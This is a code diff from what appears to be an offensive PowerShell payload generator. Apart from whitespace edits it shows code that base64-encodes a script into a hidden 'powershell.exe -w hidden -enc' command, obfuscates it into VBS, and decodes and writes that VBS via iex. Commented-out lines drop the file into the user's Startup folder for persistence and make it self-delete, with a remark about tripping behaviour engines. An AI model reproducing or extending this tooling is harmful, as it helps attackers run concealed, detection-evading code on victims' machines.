@@ -180,9 +180,9 @@ function genenc-script {
 	
    	$encscript = b64enc $(get-content $s | out-string )
 	
-  	$newline = "`r`n"
-    $cmdstrArray = @()
-    [int]$lineccnt = '0'
+	$newline = "`r`n"
+	$cmdstrArray = @()
+	[int]$lineccnt = '0'
 	[int]$loop = '0'
 
 	$randb64var = rand-str
@@ -207,11 +207,11 @@ function genenc-script {
 	$payload = 'powershell.exe -w hidden -enc ' + $enc_cmd 
 	$vbs_code = obfuscate-cmdstring $payload 'vbs'
 
-    #[->] get vbs code to self-destruct
-    #$randFso = rand-str
-    #$vbs_code += $newline
-    #$vbs_code += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + $newline
-    #$vbs_code += $randFso + '.DeleteFile Wscript.ScriptFullName' + $newline
+	#[->] get vbs code to self-destruct
+	#$randFso = rand-str
+	#$vbs_code += $newline
+	#$vbs_code += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + $newline
+	#$vbs_code += $randFso + '.DeleteFile Wscript.ScriptFullName' + $newline
 	
 	$b64_vbs = b64enc $vbs_code
 
@@ -253,7 +253,7 @@ function genenc-script {
 	# first command string generates a vbs file to user start up folder, this trips behavior engines.
 	#$command =  'iex "`$e=(gc C:\Users\Public\'+$b64vbs_file+'|out-string);`$s=[System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String(`$e));`$p=""C:\Users\$((gci env:username).value)\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'+$vbs_script+'"";set-content `$p `$s -Encoding ASCII"'
 	
-	# second command string generates then executes a vbs file to the public roaming folder
+	# second command string generates then executes a vbs file to the public roaming folder (changed to the temp folder)
 	$command =  'iex "`$e=(gc C:\temp\'+$b64vbs_file+'|out-string);`$s=[System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String(`$e));`$p=""C:\temp\'+$vbs_script+'"";set-content `$p `$s -Encoding ASCII"'
 	
 	
